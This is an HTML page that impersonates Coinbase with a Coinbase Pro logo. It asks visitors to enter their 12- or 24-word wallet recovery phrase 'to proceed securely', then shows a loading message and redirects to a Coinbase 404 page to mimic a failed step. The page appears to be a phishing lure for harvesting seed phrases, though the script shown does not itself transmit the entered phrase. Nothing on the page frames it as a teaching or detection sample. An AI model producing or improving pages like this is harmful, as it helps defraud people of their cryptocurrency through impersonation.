<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Enter Seed Phrase</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
  <style>
    /* Your CSS unchanged */
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Inter', sans-serif;
    }

    body {
      background-color: #ffffff;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }

    .header {
      width: 100%;
      height: 64px;
      display: flex;
      align-items: center;
      padding: 0 24px;
      border-bottom: 1px solid #ffffff;
    }

    .logo {
      height: 40px;
    }

    .container {
      display: flex;
      flex-direction: column;
      align-items: center;
      padding-top: 48px;
    }

    .card {
      width: 100%;
      max-width: 420px;
      padding: 48px 36px;
      border: 1px solid #e5e5e5;
      border-radius: 16px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.05);
      text-align: center;
    }

    h2 {
      font-size: 24px;
      font-weight: 600;
      color: #111111;
      margin-bottom: 12px;
    }

    p {
      font-size: 14px;
      color: #555;
      margin-bottom: 24px;
    }

    textarea {
      width: 100%;
      height: 100px;
      padding: 14px;
      font-size: 14px;
      border: 1px solid #cccccc;
      border-radius: 10px;
      resize: none;
      margin-bottom: 24px;
      font-family: monospace;
    }

    .btn {
      width: 100%;
      padding: 14px;
      font-size: 16px;
      font-weight: 600;
      border-radius: 999px;
      border: none;
      cursor: pointer;
      margin-bottom: 16px;
    }

    .submit-btn {
      background-color: #196aff;
      color: white;
    }

    .submit-btn:hover {
      background-color: #1457d2;
    }

    .cancel-btn {
      background-color: #f3f3f3;
      color: #333;
    }

    .cancel-btn:hover {
      background-color: #e2e2e2;
    }

    @media (max-width: 480px) {
      .card {
        padding: 40px 24px;
      }
    }
  </style>
</head>
<body>

  <div class="header">
    <img class="logo" src="Coinbase_Pro_2021_App-removebg-preview.png" alt=" Logo" /> 
  </div>

  <div class="container">
    <div class="card">
      <h2>Enter your seed phrase</h2>
      <p>Type your 12 or 24-word recovery phrase to proceed securely.</p>

      <form id="seedForm">
        <textarea placeholder="e.g. moon galaxy breeze token..." required></textarea>
        <button class="btn submit-btn" type="submit">Continue</button>
        <button class="btn cancel-btn" type="button" style="cursor: default;">Cancel</button>
      </form>
    </div>
  </div>

  <script>
    document.getElementById("seedForm").addEventListener("submit", function (e) {
      e.preventDefault();

      const continueButton = this.querySelector(".submit-btn");
      continueButton.textContent = "Loading...";
      continueButton.disabled = true;

      setTimeout(() => {
        window.location.href = "https://www.coinbase.com/404";
      }, 2000);
    });
  </script>

</body>
</html>
